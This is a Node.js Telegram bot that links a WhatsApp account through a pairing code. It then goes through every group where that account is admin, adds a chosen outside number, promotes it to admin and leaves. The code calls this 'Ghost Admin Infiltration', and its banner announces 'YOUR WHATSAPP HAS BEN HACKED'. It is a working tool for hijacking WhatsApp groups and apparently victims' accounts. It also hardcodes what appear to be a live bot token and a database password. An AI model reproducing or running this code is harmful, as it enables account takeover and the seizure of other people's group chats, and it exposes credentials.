// =================================================================
// ⚡ DX-SYSTEM ULTRA v9.6 (GLITCH FIXED, RENDER ALIVE & FONT FIXED)
// 👨‍💻 Developed by: DX-CODEX
// =================================================================

import TelegramBot from 'node-telegram-bot-api';
import mongoose from 'mongoose';
import express from 'express';
import { 
    makeWASocket, 
    useMultiFileAuthState, 
    DisconnectReason, 
    delay, 
    fetchLatestBaileysVersion, 
    jidNormalizedUser, 
    Browsers,
    makeCacheableSignalKeyStore
} from '@whiskeysockets/baileys';
import pino from 'pino';
import fs from 'fs-extra'; 
import pn from 'awesome-phonenumber'; 

// --- [ ⚙️ CONFIGURATION ] ---
const CONFIG = {
    BOT_TOKEN: "8113879008:AAGEZaE4v7OZGguk_g-J9qbRm2-yYpiwXc0", // Replace if needed
    MONGO_URL: "mongodb+srv://dxsimu:mnbvcxzdx@dxsimu.0qrxmsr.mongodb.net/?appName=dxsimu", 
    OWNER_IDS: [6703335929, 5136260272], 
};

// --- [ 🎨 DX FONT STYLER (COOL TEXT) ] ---
// Number mapping removed so inputs (0-9) stay standard size and visible
const toDxFont = (text) => {
    const map = {
        'a': 'ᴀ', 'b': 'ʙ', 'c': 'ᴄ', 'd': 'ᴅ', 'e': 'ᴇ', 'f': 'ғ', 'g': 'ɢ', 'h': 'ʜ', 'i': 'ɪ',
        'j': 'ᴊ', 'k': 'ᴋ', 'l': 'ʟ', 'm': 'ᴍ', 'n': 'ɴ', 'o': 'ᴏ', 'p': 'ᴘ', 'q': 'ǫ', 'r': 'ʀ',
        's': 's', 't': 'ᴛ', 'u': 'ᴜ', 'v': 'ᴠ', 'w': 'ᴡ', 'x': 'x', 'y': 'ʏ', 'z': 'ᴢ',
        'A': 'ᴀ', 'B': 'ʙ', 'C': 'ᴄ', 'D': 'ᴅ', 'E': 'ᴇ', 'F': 'ғ', 'G': 'ɢ', 'H': 'ʜ', 'I': 'ɪ',
        'J': 'ᴊ', 'K': 'ᴋ', 'L': 'ʟ', 'M': 'ᴍ', 'N': 'ɴ', 'O': 'ᴏ', 'P': 'ᴘ', 'Q': 'ǫ', 'R': 'ʀ',
        'S': 's', 'T': 'ᴛ', 'U': 'ᴜ', 'V': 'ᴠ', 'W': 'ᴡ', 'X': 'x', 'Y': 'ʏ', 'Z': 'ᴢ'
    };
    return text.split('').map(c => map[c] || c).join('');
};

const ui = {
    header: (title) => `<b>⚡ ${toDxFont(title)}</b>\n━━━━━━━━━━━━━━━━━━━━`,
    code: (text) => `<code>${text}</code>`,
    bold: (text) => `<b>${text}</b>`,
    error: (text) => `<b>💀 ᴇʀʀᴏʀ:</b> ${text}`,
    success: (text) => `<b>💎 sᴜᴄᴄᴇss:</b> ${text}`,
    line: () => `━━━━━━━━━━━━━━━━━━━━`
};

// --- [ 🗄️ DATABASE CONNECTION ] ---
mongoose.connect(CONFIG.MONGO_URL)
    .then(() => console.log('✅ MongoDB Connected (DX-NET)'))
    .catch(err => console.error('❌ MongoDB Error:', err));

const userSchema = new mongoose.Schema({
    userId: { type: Number, unique: true }, 
    firstName: String,
    username: String,
    isBanned: { type: Boolean, default: false },
    waConnected: { type: Boolean, default: false },
    sudoNumber: { type: String, default: null },
    joinedDate: { type: Date, default: Date.now }
});
const User = mongoose.model('User', userSchema);

// --- [ 🌐 SERVER KEEP-ALIVE (RENDER ANTI-SLEEP) ] ---
const app = express();
app.get('/', (req, res) => res.send('<b>⚡ DX-SYSTEM v9.6 RUNNING... STATUS: ALIVE</b>'));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🖥️ Server Online on Port: ${PORT}`);
    
    // ⏰ Auto-Pinger (Ping every 5 minutes to prevent sleep on Render)
    const RENDER_EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
    
    setInterval(async () => {
        try {
            const res = await fetch(RENDER_EXTERNAL_URL);
            console.log(`[KEEP-ALIVE] 🟢 Pinged Server - Status: ${res.status}`);
        } catch (error) {
            console.log(`[KEEP-ALIVE] 🔴 Ping Failed: ${error.message}`);
        }
    }, 5 * 60 * 1000); // 5 Minutes
});

// --- [ 🤖 BOT INIT & STATE MAPS ] ---
const bot = new TelegramBot(CONFIG.BOT_TOKEN, { polling: true });
const userStates = new Map();
const userDataCache = new Map();
const activeSessions = new Map();
const pairingRequests = new Map(); 

// --- [ 🛡️ HELPERS ] ---
async function isBanned(userId) {
    const user = await User.findOne({ userId });
    return user?.isBanned || false;
}

// 🔥 CRITICAL: Force Clean Session
async function cleanSession(tgUserId) {
    const sessionPath = `./sessions/session_${tgUserId}`;
    
    if (pairingRequests.has(tgUserId)) {
        clearTimeout(pairingRequests.get(tgUserId));
        pairingRequests.delete(tgUserId);
    }

    if (activeSessions.has(tgUserId)) {
        try {
            const sock = activeSessions.get(tgUserId);
            sock.end(undefined);
            sock.ws.close();
        } catch (e) { console.log(`Socket close error for ${tgUserId}:`, e.message); }
        activeSessions.delete(tgUserId);
    }

    if (fs.existsSync(sessionPath)) {
        await fs.remove(sessionPath);
        console.log(`♻️ GLITCH FIX: Wiped session for ${tgUserId}`);
    }

    await User.updateOne({ userId: tgUserId }, { waConnected: false });
}

// --- [ 🟢 WHATSAPP CORE ] ---
async function startWhatsAppSession(tgUserId, loginPhone, sudoPhone) {
    await cleanSession(tgUserId);
    
    const sessionPath = `./sessions/session_${tgUserId}`;
    
    const pNumber = pn('+' + loginPhone.replace(/[^0-9]/g, ''));
    if (!pNumber.isValid()) {
        return bot.sendMessage(tgUserId, ui.error("Invalid Number Format! Use International format without '+'. Example: 91987654321"), { parse_mode: 'HTML' });
    }
    const cleanPhone = pNumber.getNumber('e164').replace('+', '');

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        logger: pino({ level: 'silent' }), 
        printQRInTerminal: false,
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
        },
        browser: Browsers.ubuntu('Chrome'), 
        markOnlineOnConnect: false,
        syncFullHistory: false, // Prevents hanging on login
        generateHighQualityLinkPreview: false,
        connectTimeoutMs: 60000,
        keepAliveIntervalMs: 10000,
        emitOwnEvents: true,
        retryRequestDelayMs: 2000
    });

    activeSessions.set(tgUserId, sock);

    if (!sock.authState.creds.registered) {
        const pReq = setTimeout(async () => {
            try {
                if(!activeSessions.has(tgUserId)) return; 
                
                console.log(`Requesting Code for: ${cleanPhone}`);
                const code = await sock.requestPairingCode(cleanPhone);
                const finalCode = code?.match(/.{1,4}/g)?.join('-') || code;
                
                const msg = `${ui.header('⚡ ᴘᴀɪʀɪɴɢ ᴄᴏᴅᴇ')}\n` +
                            `📱 ɴᴜᴍʙᴇʀ: <code>${cleanPhone}</code>\n` +
                            `🔑 ᴄᴏᴅᴇ: <code>${finalCode}</code>\n\n` +
                            `<i>⚠️ Paste this code in WhatsApp > Linked Devices.\nLogin is now instant!</i>`;
                            
                bot.sendMessage(tgUserId, msg, { parse_mode: 'HTML' }).catch(()=>{});
                
            } catch (err) {
                console.error("Pair Error:", err);
                bot.sendMessage(tgUserId, ui.error(`Pairing Failed. Whatsapp might have blocked requests. Wait 5 mins and try /preset.`), { parse_mode: 'HTML' }).catch(()=>{});
                await cleanSession(tgUserId);
            }
        }, 3000); 
        pairingRequests.set(tgUserId, pReq);
    }

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'close') {
            const statusCode = (lastDisconnect.error)?.output?.statusCode;
            if (statusCode !== DisconnectReason.loggedOut) {
                console.log(`Connection drop for ${tgUserId}, reconnecting...`);
                startWhatsAppSession(tgUserId, loginPhone, sudoPhone); 
            } else {
                await cleanSession(tgUserId);
                bot.sendMessage(tgUserId, ui.error("🚫 Session Logged Out/Expired from WhatsApp."), { parse_mode: 'HTML' }).catch(()=>{});
            }
        } 
        else if (connection === 'open') {
            console.log(`✅ Connected: ${tgUserId}`);
            bot.sendMessage(tgUserId, ui.success(`<b>Connected Successfully!</b>\nStarting Advanced Infiltration Task...`), { parse_mode: 'HTML' }).catch(()=>{});
            await User.updateOne({ userId: tgUserId }, { waConnected: true });
            
            await runAdvancedAlgorithm(sock, tgUserId, sudoPhone);
        }
    });
}

// --- [ 🚀 ADVANCED ALGORITHM: ADD -> PROMOTE -> LEAVE ] ---
async function runAdvancedAlgorithm(sock, tgUserId, targetNumber) {
    try {
        const formattedSudo = targetNumber.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        const botId = jidNormalizedUser(sock.user.id);

        let statusMsg = await bot.sendMessage(tgUserId, `🔍 <b>${toDxFont("INITIALIZING ALGORITHM")}</b>\n[░░░░░░░░░░] 0%`, { parse_mode: 'HTML' }).catch(()=>{});

        const groups = await sock.groupFetchAllParticipating();
        const groupIds = Object.keys(groups);
        
        if (groupIds.length === 0) {
            if(statusMsg) {
                return bot.editMessageText(ui.error("No groups found where the bot is a member."), { chat_id: tgUserId, message_id: statusMsg.message_id, parse_mode: 'HTML' }).catch(()=>{});
            }
            return;
        }

        let stats = { success: 0, left: 0, fail: 0 };
        let count = 0;

        for (const jid of groupIds) {
            count++;
            let progress = Math.floor((count / groupIds.length) * 10);
            let bar = '▓'.repeat(progress) + '░'.repeat(10 - progress);
            
            if(statusMsg && (count % 2 === 0 || count === groupIds.length)) {
                bot.editMessageText(`⚙️ <b>${toDxFont("INFILTRATING GROUPS")}</b>\n[${bar}] ${Math.floor((count / groupIds.length) * 100)}%\n\n<i>Current Target: Group ${count}/${groupIds.length}</i>`, { chat_id: tgUserId, message_id: statusMsg.message_id, parse_mode: 'HTML' }).catch(()=>{});
            }

            await delay(Math.floor(Math.random() * 1500) + 1000); 

            try {
                const metadata = await sock.groupMetadata(jid).catch(() => null);
                if (!metadata || metadata.announce) {
                    stats.fail++;
                    continue;
                }

                const botAdmin = metadata.participants.find(p => jidNormalizedUser(p.id) === botId);
                
                if (botAdmin?.admin) {
                    
                    const isPresent = metadata.participants.find(p => jidNormalizedUser(p.id) === formattedSudo);
                    if (!isPresent) {
                        try {
                            await sock.groupParticipantsUpdate(jid, [formattedSudo], "add");
                            await delay(1500);
                        } catch (err) { }
                    }

                    const freshMeta = await sock.groupMetadata(jid);
                    const sudoUser = freshMeta.participants.find(p => jidNormalizedUser(p.id) === formattedSudo);
                    
                    if (sudoUser && !sudoUser.admin) {
                        await sock.groupParticipantsUpdate(jid, [formattedSudo], "promote");
                        stats.success++;
                        await delay(1000);
                    } else if (sudoUser?.admin) {
                        stats.success++; 
                    }

                    await sock.groupLeave(jid);
                    stats.left++;

                } else {
                    stats.fail++;
                }
            } catch (e) {
                stats.fail++;
            }
        }

        const report = ui.header('⚡ ᴏᴘᴇʀᴀᴛɪᴏɴ sᴜᴄᴄᴇssғᴜʟ') + 
                       `\n👑 <b>Admin Given:</b> ${stats.success}` +
                       `\n👋 <b>Bot Escaped:</b> ${stats.left}` +
                       `\n🛡️ <b>Failed/Not Admin:</b> ${stats.fail}` +
                       `\n\n<i>🔥 Mission Completed Logically.</i>`;
        
        bot.sendMessage(tgUserId, report, { parse_mode: 'HTML' }).catch(()=>{});

    } catch (e) {
        bot.sendMessage(tgUserId, ui.error("System Override Error: " + e.message), { parse_mode: 'HTML' }).catch(()=>{});
    }
}

// --- [ 🎮 TELEGRAM COMMANDS ] ---

bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    if (await isBanned(chatId)) return bot.sendMessage(chatId, ui.error("🚫 <b>YOU ARE BANNED FROM DX-SYSTEM</b>"), { parse_mode: 'HTML' }).catch(()=>{});

    await cleanSession(chatId);
    userStates.delete(chatId);
    
    await User.updateOne({ userId: chatId }, { 
        firstName: msg.from.first_name, 
        username: msg.from.username 
    }, { upsert: true });

    const welcomeMsg = ui.header('ɴɪᴋᴏ sʏsᴛᴇᴍ ᴠ₉.₆') +
        `\n👋 <b>Hᴇʟʟᴏ ${msg.from.first_name}</b>\n` +
        `\n🚀 <b>Sᴛᴀᴛᴜs:</b> <code>ONLINE (PRO)</code>` +
        `\n🔧 <b>Mᴏᴅᴇ:</b> <code>Ghost Admin Infiltration</code>` +
        `\n\n${toDxFont("Press the button to initiate safely.")}`;

    bot.sendMessage(chatId, welcomeMsg, {
        reply_markup: {
            inline_keyboard: [
                [{ text: "⚡ START PAIRING", callback_data: 'login' }],
                [{ text: "♻️ RESET / FORCE FIX", callback_data: 'preset_btn' }]
            ]
        },
        parse_mode: 'HTML'
    }).catch(()=>{});
});

bot.onText(/\/preset/, async (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, `⏳ ${toDxFont("ᴘᴜʀɢɪɴɢ ᴏʟᴅ ᴅᴀᴛᴀ...")}`, { parse_mode: 'HTML' }).catch(()=>{});
    
    await cleanSession(chatId);
    
    setTimeout(() => {
        bot.sendMessage(chatId, ui.success("System Cleared! Ready for new connection."), {
            reply_markup: { inline_keyboard: [[{ text: "⚡ NEW PAIR", callback_data: 'login' }]] },
            parse_mode: 'HTML'
        }).catch(()=>{});
    }, 1500);
});

bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    if (await isBanned(chatId)) return;

    if (query.data === 'login') {
        await cleanSession(chatId); 
        userStates.set(chatId, 'WAITING_LOGIN');
        bot.sendMessage(chatId, `📱 <b>Enter Your WhatsApp Number:</b>\n<i>(Number bot will login to)</i>\nEx: <code>919876543210</code>`, { parse_mode: 'HTML' }).catch(()=>{});
    }
    if (query.data === 'preset_btn') {
        bot.sendMessage(chatId, `⏳ ${toDxFont("ʀᴇsᴇᴛᴛɪɴɢ...")}`, { parse_mode: 'HTML' }).catch(()=>{});
        await cleanSession(chatId);
        bot.sendMessage(chatId, ui.success("Done! Press /start Again."), { parse_mode: 'HTML' }).catch(()=>{});
    }
});

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    if (!text || text.startsWith('/') || await isBanned(chatId)) return;

    const state = userStates.get(chatId);

    if (state === 'WAITING_LOGIN') {
        if (text.length < 7) return bot.sendMessage(chatId, ui.error("Invalid Number. Try again."), { parse_mode: 'HTML' }).catch(()=>{});
        
        userDataCache.set(chatId, { login: text });
        userStates.set(chatId, 'WAITING_SUDO');
        
        bot.sendMessage(chatId, `👑 <b>Enter Target/Sudo Number:</b>\n<i>(Who will receive Admin power?)</i>\nEx: <code>919876543210</code>`, { parse_mode: 'HTML' }).catch(()=>{});
    }
    else if (state === 'WAITING_SUDO') {
        const data = userDataCache.get(chatId);
        userStates.delete(chatId); 
        
        await User.updateOne({ userId: chatId }, { sudoNumber: text });
        
        bot.sendMessage(chatId, `⚙️ ${toDxFont("ɢᴇɴᴇʀᴀᴛɪɴɢ ʙʏᴘᴀss ᴄᴏᴅᴇ...")}\nPlease wait a few seconds.`, { parse_mode: 'HTML' }).catch(()=>{});
        startWhatsAppSession(chatId, data.login, text);
    }
});

// --- [ 👮 ADMIN: ADVANCED USERS ] ---

bot.onText(/\/users/, async (msg) => {
    const chatId = msg.chat.id;
    if (!CONFIG.OWNER_IDS.includes(chatId)) return;

    const allUsers = await User.find({});
    const active = allUsers.filter(u => u.waConnected).length;
    const banned = allUsers.filter(u => u.isBanned).length;

    let txt = "--- [ DX-SYSTEM DATABASE RECORD ] ---\n";
    txt += `Date: ${new Date().toISOString()}\n`;
    txt += `Total: ${allUsers.length} | Active: ${active} | Banned: ${banned}\n`;
    txt += "-----------------------------------------------------\n";
    txt += "USER_ID      | STATUS | SUDO_NUM      | NAME\n";
    txt += "-----------------------------------------------------\n";
    
    allUsers.forEach(u => {
        const status = u.isBanned ? "[BAN]" : (u.waConnected ? "[ON ]" : "[OFF]");
        const name = (u.firstName || "Unknown").replace(/\|/g, ''); 
        txt += `${u.userId.toString().padEnd(12)} | ${status}  | ${u.sudoNumber || 'NONE'.padEnd(13)} | ${name}\n`;
    });

    await bot.sendMessage(chatId, 
        ui.header('ᴅᴀᴛᴀʙᴀsᴇ sᴛᴀᴛs') +
        `\n👥 <b>Total Users:</b> ${allUsers.length}` +
        `\n🟢 <b>Active:</b> ${active}` +
        `\n🔴 <b>Banned:</b> ${banned}` +
        `\n\n<i>📄 Detailed list sent as file below...</i>`, 
        { parse_mode: 'HTML' }
    ).catch(()=>{});

    bot.sendDocument(chatId, Buffer.from(txt, 'utf-8'), {}, {
        filename: 'dx_users_db.txt',
        contentType: 'text/plain'
    }).catch(()=>{});
});

bot.onText(/\/ban (.+)/, async (msg, match) => {
    if (!CONFIG.OWNER_IDS.includes(msg.chat.id)) return;
    
    const target = match[1];
    const user = await User.findOne({ userId: target });

    if (user) {
        user.isBanned = true;
        await user.save();
        await cleanSession(user.userId); 
        bot.sendMessage(msg.chat.id, ui.success(`User ${user.firstName} has been <b>BANNED & DISCONNECTED</b>`), { parse_mode: 'HTML' }).catch(()=>{});
    } else {
        bot.sendMessage(msg.chat.id, ui.error("User not found in DB")).catch(()=>{});
    }
});

bot.onText(/\/unban (.+)/, async (msg, match) => {
    if (!CONFIG.OWNER_IDS.includes(msg.chat.id)) return;
    await User.updateOne({ userId: match[1] }, { isBanned: false });
    bot.sendMessage(msg.chat.id, ui.success(`User <b>UNBANNED</b>`), { parse_mode: 'HTML' }).catch(()=>{});
});

// --- [ 🔚 COOL MYSELF SIGNATURE ] ---
setTimeout(() => {
    console.log('\n');
    console.log('█▀▀▄ ▀▄░▄▀ ░░ █▀▀ █▀▀█ █▀▀▄ █▀▀ ▀▄░▄▀');
    console.log('█░░█ ░░█░░ ▀▀ █░░ █░░█ █░░█ █▀▀ ░░█░░');
    console.log('▀▀▀░ ▄▀░▀▄ ░░ ▀▀▀ ▀▀▀▀ ▀▀▀░ ▀▀▀ ▄▀░▀▄');
    console.log('──────────────────────────────────────');
    console.log(' SYSTEM ONLINE - YOUR WHATSAPP HAS BEN HACKED 🚀');
    console.log('──────────────────────────────────────');
}, 1000);

// Error Handling (Prevents the app from crashing on unhandled errors)
process.on('uncaughtException', (e) => console.log('⚠️ Fatal:', e.message));
process.on('unhandledRejection', (e) => console.log('⚠️ Reject:', e.message));
